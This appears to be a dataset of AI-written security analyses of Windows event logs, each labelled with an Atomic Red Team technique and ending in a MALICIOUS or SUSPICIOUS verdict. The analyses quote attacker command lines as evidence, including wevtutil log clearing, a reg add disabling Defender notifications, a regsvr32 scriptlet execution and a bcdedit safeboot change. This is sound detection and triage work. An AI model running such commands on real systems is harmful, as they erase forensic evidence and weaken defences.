- **Immediate Incident Response:** Initiate incident response procedures, isolate the affected host, and conduct further investigations to determine the full scope of the compromise.
- **Review and Restore Logs:** Attempt to retrieve logs from backups if available to understand the activities before the logs were cleared.
- **Forensic Analysis:** Conduct a full forensic analysis of the system to identify any further malicious tools or scripts that may have been used.
- **User Review and Action:** Review access logs and behavioral patterns related to the user `SERVER002\admin_test` and consider revoking or re-evaluating their privileges.
- **Security Enhancements:** Strengthen logging, monitoring, and alerting mechanisms and ensure that log-clearing activities trigger alerts in the future. Consider implementing additional security measures like application whitelisting and enhanced endpoint detection and response capabilities."
Indirect Command Execution - pcalua.exe,"## Detailed Analysis of the Logs

### System Log
1. **Log Clearing Events:**
   - Multiple log files (System, Windows PowerShell, Security) were cleared by the user `admin_test`. 
   - EventID 104 and 1102 indicate that the logs have been cleared, which is typically suspicious if the user doesn’t have a record of performing this activity during typical operations.
   - Clearing logs is often indicative of an attempt to cover tracks after potential malicious activities.

### Security Log
- **EventID 1102 specifically indicates that the audit log was cleared.** This is a significant indicator as it is quite rare for legitimate users to require such actions, and it often coincides with malicious activity where the attacker is trying to evade detection by covering tracks.

### Sysmon Log
1. **Processes Execution:**
   - Several system utilities (`wevtutil.exe`, `hostname.exe`, `whoami.exe`) were executed by the same user (admin_test) within a very short timeframe.
   - `wevtutil.exe` is used for clearing logs (`cl` command in the command line) and seeing this used multiple times to clear different channels corroborates the log clearing noted in the system and security logs.
   - Execution of `cmd.exe` with the command line that includes `pcalua.exe` and `calc.exe` appears odd. It is unusual behavior for someone to use the Compatibility Assistant (pcalua.exe) in this context.

2. **Integrity Level:**
   - All suspicious processes were executed at a high integrity level, which means the user had administrative privileges. This is a high-risk scenario as it allows significant changes to be made to the system.

### Suspicious Indicators
- **Log Clearing:** System and Security logs were cleared, indicative of potential malicious activity and cover-up strategy.
- **Command Execution Pattern:** Execution of common utilities and `cmd.exe` with suspicious command-line arguments not typically associated with regular admin procedures.
- **Rapid Sequence of Events:** A burst of activities (spanning different utilities and commands) occurred within a very concentrated timeframe (around the same timestamp), which is not characteristic of standard, benign user behavior.

### Conclusion
Given the log-clearing events, the high integrity level of processes, the sequence of executed utilities, and the unusual command-line behavior, there is a potential that these logs are indicative of compromise or malicious intent.

**Final Resolution:** MALICIOUS

### Recommendations for Proceeding
1. **Containment:** Isolate the affected host (Server002) from the network to prevent further potential damage.
2. **Investigation:** Conduct a full forensic analysis of the system to understand the extent of the compromise.
3. **Audit Logs:** Review and correlate with any other available logs or data sources for additional context.
4. **User Accounts:** Review the actions of the admin_test user account, including password changes and privilege assignments. Consider disabling or severely restricting the account until more information is known.
5. **Remediation:** Based on findings, re-image the host if necessary and apply necessary security updates or configurations to prevent reoccurrence.
6. **Monitoring:** Increase monitoring and alerting for similar log-clearing or command execution events on other systems in the environment."
Disable Win Defender Notification,"Upon reviewing the Windows event logs provided, several indicators suggest potentially malicious activity:

1. **Log Clearing**:
   - Multiple instances of logs being cleared by the user ""admin_test"" are present, as indicated by Event IDs 104 in the System log and Event ID 1102 in the Security log. For example:
     - System log: 
       - `{""EventID"":""104"",""TimeCreated"":""2024-10-24 17:09:55.8972939""}`
       - `{""EventID"":""104"",""TimeCreated"":""2024-10-24 17:09:56.0540992""}`
     - Security log: 
       - `{""EventID"":""1102"",""TimeCreated"":""2024-10-24 17:09:55.9965694""}`

   - The user associated with these actions is ""SERVER002\\admin_test"". Log clearing activities, especially when done sequentially and across different logs, are often attempts to cover tracks of potentially malicious activities.

2. **Command and Control Execution**:
   - Events indicate the execution of wevtutil.exe to clear logs. The command line for this action is:
     - `""C:\\Windows\\system32\\wevtutil.exe"" cl <LogName>`
   - The regular use of `wevtutil.exe` for clearing logs by a non-standard or testing admin account is suspicious and indicative of attempts at obfuscation post-exploitation.

3. **Registry Modification**:
   - Attempts to modify registry settings related to Windows Defender are observed. This is executed with:
     - `""C:\\Windows\\System32\\cmd.exe"" /c reg add ""HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications"" /v ""DisableNotifications"" /t REG_DWORD /d 1 /f`
   - Registry changes to disable notifications for security settings could be indicative of malicious intent, as attackers often disable protections or notifications as part of their attack sequence to evade detection.

4. **General Anomalies and Patterns**:
   - Immediate sequences of using system utilities like `hostname.exe` and `whoami.exe`, although routine in some scripts, seemed unusual right after the clearing of logs and registries. This warrants further investigation into the purpose and script ownership.

Given these observations, there is a high likelihood of malicious activity with intent to cover tracks and potentially disable security notifications. Thus, the final assessment of the log entries is:

**Resolution: MALICIOUS**

**Guidance on How to Proceed**:
- **Containment**: Immediately restrict the activities of the user account ""admin_test"" to prevent further potential damage or data exfiltration.
  
- **Investigation**: Conduct a thorough forensic analysis of the affected system (Server002) to determine the extent of the compromise and to identify any other malicious artifacts or persistence mechanisms.
  
- **Remediation**: 
  - Reset all affected system and network configurations.
  - Strengthen monitoring for similar activities, especially focusing on log tampering and registry changes related to security tools.
  - Enact a company-wide audit of privileged accounts and enhance monitoring with proper alerts for sensitive operations like log clearing.

- **Review and Update Security Policies**: Ensure that proper logging is enforced and that any log clearing activities trigger immediate alerts for IT security to investigate."
Javascript in registry,"Upon reviewing the provided Windows event logs, I have identified several noteworthy observations:

### 1. Suspicious PowerShell Activity:

- **PowerShell Events:** 
  - There are multiple instances in the PowerShell logs where the `New-ItemProperty` cmdlet is used to modify the registry key `HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings`. The property name `T1112` is a reference to MITRE ATT&CK's Tactic ID for registry modifications, which is commonly used in malicious activities. The value being set is an encoded string that resembles HTML `<script>` tags, indicative of possible scripting or injection activity.
  - The PowerShell command is executed with a `HostApplication` of `powershell.exe`, suggesting that this script might have been executed manually or by another process with elevated permissions.

### 2. Sysmon Events:

- **Log Clearing Events:** 
  - Multiple entries in the Sysmon logs indicate the use of `wevtutil.exe` to clear event log records, specifically the Security, System, and PowerShell logs. These actions are often associated with attempts to cover up tracks by an attacker after malicious activity has been conducted.
  - The user conducting these actions, `admin_test`, is operating with high integrity levels which suggests the presence of elevated privileges.

### 3. Security Events:

- **Time Change Events:**
  - There are several occurrences where system time was altered. Time manipulation can be used by attackers to modify timestamps in the logs to confuse incident responders and hide the time of the actual malicious activity.

- **Clear Log Activity:**
  - The Security event log has been cleared (`EventID: 1102`), which is a significant indicator of potential malicious activity, typically done to erase evidence from the security logs.

### 4. Evaluation and Resolution:

Based on the activities observed, especially the suspicious PowerShell script execution involving registry modifications, the clearing of event logs using `wevtutil.exe`, and log clearing attempts, there are strong indicators of compromise.

### Conclusion:

- **Final Assessment:** MALICIOUS
  
The identified activities show clear evidence of malicious intent, particularly the registry modifications using PowerShell, time changes, event log clearing, and the account `admin_test` has been used in these operations under high integrity levels, which typically suggest privilege escalation or misuse. This behavior is consistent with post-exploitation tactics used to establish persistence, hide traces, and possibly prepare for further malicious operations.

### Recommended Actions:

1. **Immediate Incident Response:** Initiate incident response procedures to contain and mitigate the threat. This includes isolating affected systems, analyzing any associated network traffic, and ensuring other endpoints in the environment have not been similarly compromised.

2. **Audit and Monitoring:** Increase monitoring of PowerShell script executions and any use of Admin accounts like `admin_test`. Deploy additional logging and monitoring on event log cleaning commands.

3. **Credential Review:** Conduct a review of user accounts with elevated privileges. Investigate and restrict abnormal or unauthorized use of credentials.

4. **Registry and System Hardening:** Audit and verify any unexpected changes in the registry and system configurations. Implement measures to prevent unauthorized changes.

5. **Full Forensic Investigation:** Perform a comprehensive forensic analysis of the affected systems to understand the breadth of the compromise and identify any related artifacts or backdoors left by the attackers."
Rundll32 execute VBscript command using Ordinal number,"### Detailed Analysis of the Provided Logs:

#### Suspicious or Anomalous Behavior Noted:

1. **Time Manipulation**:
   - **Event Detecting Time Change**: There is a clear indication of time manipulation within the `System` and `Security` logs. The logs show that the system time was set back from `""2024-10-26 16:04:27.3488845""` to `""2024-10-26 16:04:23.1288676""`. This backdating of system time (`Events 3568` and `30349`) can be a tactic used to cover malicious activities, as it could potentially affect time-based security events and logs.

2. **Clearing of Logs**:
   - **Log File Clearing**: The `System`, `Security`, and `PowerShell` event logs were all cleared (`Events 104 and 1102`). The clearing of logs is often associated with attempts to remove evidence of malicious activity. The user `admin_test` is seen performing these actions. Such behavior should be investigated further as it deviates from standard operations.

3. **Execution of Suspicious Command**:
   - **Suspicious Command Trigger**: The Sysmon logs show an execution of `cmd.exe` with a suspicious command line involving `rundll32` and the use of `vbscript` to run `calc.exe` (`Event 17991`). This could indicate an exploitation or testing of code execution, often associated with a malicious payload attempt.

4. **Repeated High Privilege Logon Events**:
   - **Repeated Logons with High Privileges**: Multiple authentication events show the user `admin_test` logging back into the system with high privilege tokens `(SeSecurityPrivilege, SeBackupPrivilege, etc.)` (`Event 4672`). These repeated accesses and privileges might need review to confirm they align with expected administrative actions.

#### Analysis:

Based on the logs, the activity involving time manipulation, log clearance, and suspicious command execution form a pattern that could indicate possible malicious activity intended to cover tracks and possibly test or execute malicious payloads.

#### Assessment:

**Resolution**: **MALICIOUS**

The logs, especially the combination of time manipulation, log clearance, and suspicious script execution, strongly suggest attempts to either test vulnerabilities or to hide malicious activity. These actions are beyond typical benign behavior and warrant further investigation to prevent potential compromise.

#### Guidance on How to Proceed:

1. **Immediate Action**:
   - Initiate a more comprehensive investigation on `Server002` focusing on the time period where these logs indicate suspicious activity.
   - Isolate the host from the network to prevent further potential compromise.

2. **Detailed Forensic Analysis**:
   - Analyze the user `admin_test` and their activities during this period.
   - Verify the integrity of critical system files and security tools.
   - Scrutinize any network connections made during the suspicious timeframe.

3. **Audit and Security Review**:
   - Conduct a detailed audit of user permissions and ensure enforced strict access controls.
   - Ensure logging and alerting mechanisms are in place to detect any future anomalous behavior.

4. **Strengthen Defenses**:
   - Deploy advanced threat detection and response tools.
   - Regularly update and patch systems to protect against known vulnerabilities.

By taking these steps, any current threats can be managed, and the organization will be better protected against future malicious attempts."
Invoke HTML Application - Jscript Engine Simulating Double Click,"### Analysis of Windows Event Logs

#### Suspicious or Anomalous Behavior

1. **Multiple Execution of `wevtutil.exe`:** 
   - Observed multiple instances of the `wevtutil.exe` command with varied command lines such as clearing logs from `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Security` channels. This behavior is unusual as `wevtutil.exe` is used for managing event logs and its execution in such a pattern could indicate an attempt to clear logs and cover tracks after suspicious activities.

2. **Repeated Use of `conhost.exe`:**
   - `conhost.exe` processes were being spawned repeatedly with the parent process being `wevtutil.exe`. This indicates that `conhost.exe` might be used in conjunction with other applications to handle console applications initiated by potentially malicious scripts.

3. **PowerShell Execution with Suspicious Arguments:**
   - A `powershell.exe` process was launched with command `Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -SimulateUserDoubleClick`. Invoking HTA (HTML Application) files using PowerShell is often used in attacks to execute malicious scripts. The nature of the command suggests potential exploitation using HTML applications.

4. **Clearing of Logs:**
   - Security logs, system logs, and PowerShell logs were cleared, which is a common tactic used by attackers to eliminate evidence of their activities on a system.

5. **`UsoClient.exe` and `WindowsPowerShell` activities:**
   - Execution of `UsoClient.exe` for update operations could be an indicator of scheduled tasks triggering actions, but in conjunction with the surrounding suspicious activities, it warrants further investigation.

#### Potential Malicious Indicators

- **Log Clearing Activities (`Event ID 104` and `Event ID 1102` in Security Log):** Indicates deliberate actions to remove traces, commonly associated with malicious activity.
- **Suspicious PowerShell Commands:** The pattern of command execution involving PowerShell and loading potentially malicious payloads.
- **Administrative Actions by Non-Adconventional Users:** All actions were performed by `SERVER002\\admin_test`, indicating actions required administrative privileges, which if not a usual behavior, raises a red flag.

### Assessment of the Situation

The presence of multiple `wevtutil.exe` processes clearing log files, along with the execution of potentially malicious PowerShell commands (such as using `Invoke-ATHHTMLApplication`), constitutes significant evidence of suspicious activities that align with tactics used by threat actors to obfuscate their actions. The evidence suggests deliberate actions to cover tracks after potentially deploying malicious software or engaging in unauthorized activities.

### Threats or Risks Identified

- **Risk of Unauthorized Access and Data Exfiltration:** If additional unauthorized PowerShell scripts or processes are not identified, there is a risk that the host may have been exploited for data exfiltration or other malicious activities.
- **Persistence Mechanisms and Data Erasure:** Adversaries may have established persistence on the host and could have access even if it seems benign at the moment.

### Recommendation and Resolution

1. **Immediate Isolation of `Server002`:** To prevent potential lateral movement or further compromise.
2. **Full Forensic Investigation:** Examine the system thoroughly for malicious payloads, and conduct a deep dive into the remaining event logs to ensure no persistence mechanisms exist.
3. **Credential Auditing:** Check login patterns and remote connections to this system, and consider a review of user privileges.
4. **Patch and Update System:** Ensure the system is up-to-date with the latest security patches to close any exploited vulnerabilities.

**Resolution: MALICIOUS** - The logs provide substantial evidence of potentially malicious activity, characterized by log clearing, suspicious command executions, and administrative privilege use without apparent justification. Further action is warranted to safeguard the network and systems."
Activate Windows NoClose Group Policy Feature,"Based on the analysis of the provided logs from the Windows host, the following points stand out:

1. **Security Log and Sysmon Events**:
    - The most significant event is the clearing of logs using `wevtutil.exe`, noted in the Sysmon logs and corroborated by the Security and System logs (Event ID 1102 for Security and Event ID 104 for System). This action is concerning because attackers often clear logs to cover their tracks. It appears multiple log channels, including Security, System, and PowerShell, have been cleared between 15:30:56 and 15:30:59.
    - The clearing actions were performed by the user `admin_test`, which suggests potentially unauthorized activity using an account with admin privileges.

2. **Other Sysmon Activity**:
    - There is an unusual concentration of process activities revolving around `conhost.exe` and `wevtutil.exe` in a very short timeframe. This suggests potential misuse of legitimate Windows utilities, often seen in evasive techniques.
    - Additionally, events related to process creation using `cmd.exe` to modify registry settings (`reg add` command) further imply potential malicious script execution or persistence mechanisms being established.

3. **Application and System Logs**:
    - No overtly suspicious activities were noted in the application logs. Regular updates and service stoppages related to Microsoft Edge Update are present, which are not inherently malicious but add context to the system's normal operation.

4. **Time Synchronization Anomaly**:
    - There is a timestamp anomaly in the Kernel-General logs where system time was adjusted. This might not be necessarily malicious but combined with log clearing, it raises suspicion as attackers can tamper with system time to complicate log chronology.

Given the above observations:

- The use of `wevtutil.exe` to clear multiple log categories by `admin_test` with a high integrity level, along with the suspicious registry modifications initiated through `cmd.exe`, point towards deliberate obfuscation and potential compromise activities.
- Considering these activities could involve attempts at privilege escalation, persistence, or lateral movement within the network.

**Resolution: SUSPICIOUS**

**Guidance and Next Steps**:
- Immediate containment actions should be considered. Disable or isolate the `Server002` host while further analysis is conducted to prevent possible lateral movement.
- Conduct a detailed forensic analysis of the host's disk and memory to discover any additional artifacts or malware present.
- Examine network logs for any outbound or lateral communications from the `Server002` around the time of these suspicious activities.
- Review access to the `admin_test` account to ensure credentials have not been compromised.
- Moving forward, monitor for any similar activities in other hosts and strengthen security configurations to prevent similar incidents."
Regsvr32 local COM scriptlet execution,"Based on the analysis of the provided logs, there are several indicators of potentially malicious activity:

### Key Observations:

1. **Clearing of Event Logs:**
   - Multiple log clearance events were observed:
     - System Log cleared: `EventID: 104`, with the process `wevtutil.exe`, executed by user `admin_test`.
     - Windows PowerShell log cleared: `EventID: 104`, with the process `wevtutil.exe`, executed by user `admin_test`.
     - Security Log cleared: `EventID: 1102`, with the process `wevtutil.exe`, executed by user `admin_test`.
   - Log clearance is a common technique used by attackers to cover their tracks and remove evidence of malicious activities.

2. **Suspicious Use of Regsvr32:**
   - A command was run using `cmd.exe` to execute `regsvr32` with a suspicious script located in a temporary directory: 
     - CommandLine: `C:\\Windows\\system32\\regsvr32.exe /s /u /i:""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.010\\src\\RegSvr32.sct"" scrobj.dll`
   - This activity is often associated with a technique known as ""Squiblydoo"", which can be used for fileless malware attacks, as seen from descriptive tactics referenced under MITRE ATT&CK T1218.010.

3. **Response and Blocking Commands:**
   - Multiple invocations of `wevtutil.exe` to clear event logs, combined with the use of `regsvr32`, suggest a deliberate attempt to conduct unauthorized actions followed by log clearance to remove traceability.

4. **High Integrity Level Processes:**
   - The activities were carried out under high integrity levels, indicating administrative privileges were leveraged.

5. **Powershell Execution:**
   - Multiple instances of `powershell.exe` are running with the user `SERVER002\\admin_test`. Although no direct evidence of misuse was captured here, this could potentially be another vector or tool being used in tandem with malware strategies.

### Assessment:
The logs present a clear pattern of suspicious and likely malicious activity, involving:
- Clearing of security, system, and application event logs.
- Use of potentially malicious scripts through the `regsvr32` utility.
- Activities requiring elevated permissions continuously executed by a user account, `admin_test`.

Therefore, the overall assessment of the situation is classified as **MALICIOUS** based on the evidence of unauthorized log-clearing activities and the use of potentially harmful command executions.

### Recommendations to Proceed:
1. **Containment:**
   - Immediately isolate the affected host `Server002` from the network to prevent any potential spread or further malicious activities.
   
2. **Further Investigation:**

   - Regularly review and update cybersecurity policies to ensure effective security practices are in place."
Command Execution with NirCmd,"Upon analyzing the provided Windows event logs, several factors stand out that may indicate suspicious or potentially malicious activity on the host system (Server002).

**Suspicious or Anomalous Behavior:**

1. **Log Clearing Events:**
   - Event ID 1102 from the Security log and Event ID 104 from the System log indicate the clearance of event logs. The user ""admin_test"" cleared logs from multiple channels, including Security, System, and PowerShell. This behavior is often used by threat actors to cover their tracks after executing malicious activities.

2. **Command Execution via PowerShell:**
   - Multiple Windows PowerShell logs (Event ID 600) show the execution of a PowerShell script that involves `nircmd.exe` from a temporary path. The script seems to hide the system tray clock using a potentially remote payload (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\nircmd.exe`). The use of temporary directories and obscure command lines can be indicative of malicious intent, especially when involving visual or UI components without user interaction.

3. **Sysmon Process Execution:**
   - Several instances of `wevtutil.exe` were executed (Sysmon Event ID 1) to clear various Windows event logs by the same user ""admin_test"". The exact command line usage (`cl Microsoft-Windows-Sysmon/Operational`) is a clear indicator of log tampering.
   
4. **Credential Access Events:**
   - Multiple Event ID 5379 from the Security log indicates failed credential access attempts for a Microsoft Account. These repeated failures could be indicative of an attempt to access an account or potential credential stuffing attack.

5. **Execution of Known Malicious Tools:**
   - The presence and execution of `nircmd.exe`, a legitimate tool used for various automation tasks, can be exploited for malicious purposes such as altering or hiding UI elements—in this case, the system tray clock.

**Assessment of the Situation:**

The combination of log clearing events, PowerShell executions referencing potentially malicious scripts, and the presence of credentials-related events, suggest that the host system has likely been compromised or is under active attack. The behaviors observed are classic indicators of malicious activity aimed at stealth and persistence.

**Identified Threats or Risks:**
- Potential cover-up and evasion tactics (log clearance).
- Execution of scripts with potentially malicious payloads.
- Possible credential compromise attempts.

**Guidance on How to Proceed:**

1. **Immediate Incident Response:**
   - Isolate the system from the network to prevent further malicious activity or potential spread.
   - Conduct a comprehensive forensic analysis to identify the full scope and origin of the compromise.

2. **Recovery and Containment:**
   - Restore logs if backups are available.
   - Review user account ""admin_test"" for unusual activity and reset credentials if necessary.
   - Use antivirus/antimalware tools to scan and clean the system.

3. **Environment Hardening:**
   - Implement stricter log monitoring and retention policies.
   - Improve PowerShell and script monitoring to detect and prevent unauthorized script execution.
   - Enhance user training and awareness, particularly around credential management and phishing threats.

**Resolution: MALICIOUS** - The logs demonstrate clear indicators of potentially malicious activities, necessitating immediate response and further investigation."
DiskShadow Command Execution,"Upon careful review, the provided logs suggest several indicators of suspicious activities. Below is a detailed analysis highlighting the significant events and their implications:

### Suspicious or Anomalous Behavior:
1. **Log Clearing Actions:**
   - The logs show multiple instances of the `wevtutil.exe` command, which is used to clear the event logs for various channels (`System`, `Security`, `Windows PowerShell`). This is executed by the user `SERVER002\admin_test`.
   - Specific events with `EventID` 104 in the System log and 1102 in the Security log indicate the clearing of event logs, which is a common tactic used by threat actors to cover their tracks.

2. **PowerShell Activities:**
   - There is a PowerShell command that launches `diskshadow.exe` with a script from a temporary path associated with `AtomicRedTeam`, a well-known threat emulation toolset. The use of `diskshadow.exe` can be associated with shadow copy manipulation, often seen in certain types of attacks, such as ransomware.
   - The PowerShell logs (`EventID` 600) confirm abnormal script execution, aligning with the invocation of the `diskshadow.exe`.

3. **Process Anomalies:**
   - The execution of `whoami.exe` and `hostname.exe` by the user `admin_test` might not be inherently suspicious but should be noted when considering the context of other activities.
   - Several instances of conhost.exe and other routine processes might have been spawned as part of typical or scripted administrative tasks, but the surrounding context makes them potentially noteworthy.

4. **Use of Sysinternals Tools:**
   - The presence of `wevtutil.exe` extensively suggests manipulation or clearing of event logs in an automated fashion. This tool is frequently used in post-exploitation activities to evade detection.

5. **Unaccounted System-Level Applications:**
   - There are events related to the Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`). While these could be legitimate system or application updates, the timing and concentration of these events alongside suspicious actions warrant further inspection.

### Assessment:
The activities recorded in these logs suggest behavior consistent with post-exploitation efforts. Specifically, the clearing of logs and the use of PowerShell scripts designed for penetration testing frameworks are clear red flags indicating potentially malicious activity.

### Resolution:
**SUSPICIOUS** - The logs contain activities that strongly suggest malicious intent. However, further investigation is needed to determine the full scope and impact. Particularly:

- Engage a thorough review of user access logs and changes in privileges around this time window to ascertain further unauthorized access or data manipulation.
- Verify the intent and origin of PowerShell scripts, especially the context around `diskshadow.exe` execution.
- Correlate the suspicious activities with other network and security logs to identify lateral movements or data exfiltration efforts.

### Recommendations:
- Increase monitoring on the account `SERVER002\admin_test` and any associated endpoints.
- Conduct a full security audit of the system involved, include checking for persistence mechanisms.
- Evaluate and deploy enhanced logging and monitoring solutions to capture potential indicators of compromise more effectively in the future.
"
Rundll32 advpack.dll Execution,"Upon analyzing the provided series of Windows event logs, several notable observations arise which hint at suspicious or potentially malicious activities:

1. **Process Executions and Command-Line Usage:**
   - **Unusual Usage of `wevtutil.exe`:** The `wevtutil.exe` utility is repeatedly used to clear various logs (e.g., Application, System, Security, Windows PowerShell). The command-line sequence includes the clearing (`cl`) of logs, which is highly suspicious as it is often leveraged in malicious activities to cover tracks.
   
   - **PowerShell Execution as Admin User:** The use of `powershell.exe` by `SERVER002\admin_test` with high integrity is noteworthy. While not malicious in itself, PowerShell is a commonly exploited tool when used with obfuscated or malicious commands.
   
2. **Log Cleared Events:**
   - **Event ID 104 and 1102:** These events indicate that the event logs, specifically System, PowerShell, and Security, were cleared by the user `admin_test`. This action is traditionally associated with attempts to cover up activity, pointing heavily towards malicious intent.

3. **Execution of Rundll32.exe:**
   - The command-line involved here is indicative of the MITRE ATT&CK technique T1218.011, involving the abuse of `rundll32` to execute arbitrary code. The involvement of a known attack vector from the Atomic Red Team (as inferred from `T1218.011`) points towards malicious testing or actual exploit usage.

4. **Abnormal Use of Legitimate Applications for Potential Attacks:**
   - Usage of `HOSTNAME.EXE` and `whoami.exe` in this context typically could be reconnaissance steps within an intrusion.

5. **Account and Privilege Usage:**
   - Logon Event IDs (e.g., 4624) showing SYSTEM-level authority access further substantiate potential unauthorized elevated access during this time.

6. **General Observations:**
   - The combination of these activities, especially the log clearing, indicates an intention to operate undetected.
   - The initiation and termination of legitimate service operations like `SecurityHealthService.exe`, `sppsvc.exe`, and `WmiPrvSE.exe` appear normal and might not necessarily be linked to the suspicious activities, but should be monitored for extended behaviors.

Given these observations, the events highlighted exhibit clear signs of malicious intent to erase activity logs and run potential payloads under the guise of system binaries. 

### Assessment Summary:
- **Resolution: MALICIOUS**

### Guidance:
1. **Containment:** Isolate the affected system `Server002` to prevent further unauthorized access or exfiltration of data.
2. **Investigation:** Conduct a deeper forensic analysis on the system, including memory analysis, to further assess the extent of the breach and identify malicious payloads.
3. **Review and Mitigation:** Review user account activities, evaluate password policy, and check other systems for similar log clearings or suspicious activities.
4. **Alert and Monitor:** Increase monitoring for similar command-line executions and log clearance activities across other hosts in the environment.

These steps should aid in both understanding the breach and preventing future occurrences."
Safe Mode Boot,"### Analysis of Windows Event Logs

Upon reviewing the provided Windows event logs, here are the findings:

#### Suspicious Behavior Detected

1. **Clearing Event Logs:**
   - Event logs for ""System"", ""Windows PowerShell"", and ""Security"" were cleared by the user `admin_test`. Clearing logs can be an indicator of malicious activity, often used to cover tracks.
   - System Log EventID 104, Security Log EventID 1102 indicate that logs were cleared by `admin_test`.

2. **Command Line Execution:**
   - There is a command execution using `cmd.exe` to run `bcdedit /set safeboot network`, which is a command that modifies the boot configuration to enable Safe Boot with networking. This could indicate an attempt to alter boot settings, possibly to bypass security mechanisms during a restart.
   - Sysmon EventID 1 indicates `cmd.exe` execution followed by `bcdedit.exe`.

3. **Integrity Level:**
   - The integrity level for the `admin_test` user processes is consistently ""High"", suggesting these processes were run with elevated privileges, which could enable the user to perform administrative tasks.
   - This is seen in multiple Sysmon events with the `admin_test` user.

4. **Suspicious Parent-Child Process Relationship:**
   - Processes like `wevtutil.exe`, `conhost.exe`, and `whoami.exe` were frequently initiated by the user `admin_test`, often with `wsmprovhost.exe` acting as a parent process. 
   - While `wevtutil.exe` could be used for legitimate purposes, its usage in conjunction with conhost.exe could be part of running scripts or commands interactively, which might not be typical for an admin user unless manually performing extensive system audits or scripts.

#### Indicators Noted
- **Time Synchronization Events:**
  - Changes in system time noted in Security and System logs (Event ID 4616) by `svchost.exe`. Time adjustments themselves are not inherently malicious, but combined with other activities, they may be indicative of an attempt to obfuscate logs and activities.

#### Conclusion and Recommendations
- **Threat Assessment:**
  - These patterns, particularly log clearance and system time modification, suggest deliberate actions to conceal activities likely indicative of potential compromise or unauthorized activities by the user `admin_test`.

- **Guidance:**
  - **Resolution: SUSPICIOUS**
    - The behavior needs further investigation to determine if `admin_test` actions are part of legitimate administrative duties or malicious activities. Steps should include:
      1. **User Confirmation:** Verify with `admin_test` and IT whether there were any authorized maintenance activities during this timeframe.
      2. **Inspect Backup Logs:** Look for backups (if any) to understand prior system states and any changes.
      3. **Monitor Network Activity:** Deploy enhanced monitoring on `Server002` and analyze network traffic to detect any further anomalous activities.
      4. **Security Policy Enforcement:** Review account permissions and enforce least privilege rules to ensure access is restricted solely to necessary duties.

- While direct evidence of data exfiltration or further compromise isn't noted in logs, these activities warrant a deeper dive to confirm system integrity and security."
InstallUtil Uninstall method call - -U variant,"Upon reviewing the provided Windows event logs, several points of potential concern and anomalous behavior have been identified:

1. **PowerShell Logs**:
   - The execution of a PowerShell script via `powershell.exe`, specifically the `InstallUtilTestHarness.ps1`, suggests activity related to the Atomic Red Team framework. This framework is frequently used for adversary emulation and red team activities to test detection capabilities. The presence of `InstallUtil.exe` being triggered is indicative of a Living Off The Land Binaries and Scripts (LOLBAS) tactic, which is often utilized for executing code under the guise of legitimate binaries.
   - The command-line activity involving dynamic compilation (`Add-Type`) and performing operations with `.NET assemblies adds another layer of suspicious activity, as this behavior is often associated with attempts to execute arbitrary code.

2. **System Logs**:
   - The clearing of logs, particularly for the Windows PowerShell channel by the user `admin_test`, is a red flag. The clearing of logs is a common tactic used by malicious actors to cover their tracks after executing potentially malicious activities.

3. **Sysmon Logs**:
   - The frequent invocation of `wevtutil.exe` to clear various event logs (Sysmon, Application, Windows PowerShell, and Security) by the same user `admin_test` (specifically from the PowerShell parent process) strongly indicates an attempt to remove forensic evidence of actions taken on the system.
   - The execution of `csc.exe` and `cvtres.exe` as part of PowerShell scripts further supports concerns of potentially malicious actions being taken, particularly in conjunction with the compilation and commandline execution patterns observed.

4. **Security Logs**:
   - Log clearance activities are confirmed in the Security logs, showing actions taken to remove entries, which is congruent with the findings in the System and Sysmon logs.

In conclusion, the combination of PowerShell scripts execution demonstrating the use of LOLBAS, log clearing activities in multiple event channels, frequent invocation of compiler utilities, and associations with known adversary simulation frameworks suggest that the logs indeed show signs of potentially malicious activity.

**Resolution**: MALICIOUS

**Guidance**:
- Immediate action should be taken to contain and investigate this host. This includes isolating the host from the network to prevent further potential damage or lateral movement.
- Conduct a thorough forensic investigation to determine any additional compromise or data exfiltration.
- Review access logs and configurations to ensure that such tactics cannot easily be repeated.
- Consider reviewing the security policies and monitoring capabilities to improve detection of such activities in the future."
Ursnif Malware Registry Key Creation,"After analyzing the provided event logs, there are several observations of activity that need careful evaluation and context. Let's break down the suspicious elements and determine a resolution.

### Summary of Key Findings:

1. **Log Clearing Events (EventID 104 and 1102)**
   - The `wevtutil.exe` utility is used several times by `admin_test` to clear logs from the System, Application, Security, and PowerShell channels.
   - These actions are often utilized by malicious actors to cover their tracks after conducting nefarious activities on a system.

2. **Suspicious Command Injection (Sysmon EventID 1)**
   - A `cmd.exe` process executed a command for registry manipulation, specifically altering the registry key `HKCU\Software\AppDataLow\Software\Microsoft\3A861D62-51E0-15700F2219A4` with binary data. 
   - This activity can indicate attempts at persistence or preparing the system for later exploitation.

3. **Unauthorized Registry Modification**
   - The use of the `reg.exe` tool to modify the registry is suspicious when combined with log clearing and execution of unusual command lines like `reg add`.
   - The specifics of the registry key and binary data suggest potential obfuscation or malware configuration efforts.

### Assessment:

- The sequence of events involves log clearing activities followed by potential registry modifications executed by high-integrity `cmd.exe` command lines. The pattern is consistent with techniques used to establish persistence or conceal malicious activities on the host.

- The account `SERVER002\admin_test` appears to have conducted all suspicious activities. This could imply misuse of an administrative account or that the account itself has been compromised.

### Resolution:

- **MALICIOUS**: The described actions are indicative of potentially malicious activity. The combination of log clearing and registry modifications, particularly through a command line, strongly suggests an attempt to hide or facilitate unauthorized actions. These are consistent with known attack behaviors used to maintain control over a system while evading detection.

### Next Steps:

1. **Immediate Investigation**: Initiate a deeper forensic investigation on `Server002`, focusing on:
   - The origin and context of the `admin_test` account's actions, including whether these actions were authorized or if the account has been compromised.
   - Analyzing any associated network traffic or external connections made around the timestamps of these events.
   - Checking for additional signs of compromise or persistence mechanisms.

2. **Containment and Eradication**:
   - Consider isolating the affected host from the network to prevent further malicious activity.
   - Review and possibly enhance security controls around log retention and system auditing.

3. **Review Administrative Account Usage**:
   - Conduct additional reviews of administrative accounts for unusual or unauthorized actions.
   - Consider implementing heightened monitoring or altering credentials as necessary.

By taking these steps, further malicious actions can potentially be curtailed and the affected system restored to a secure state."
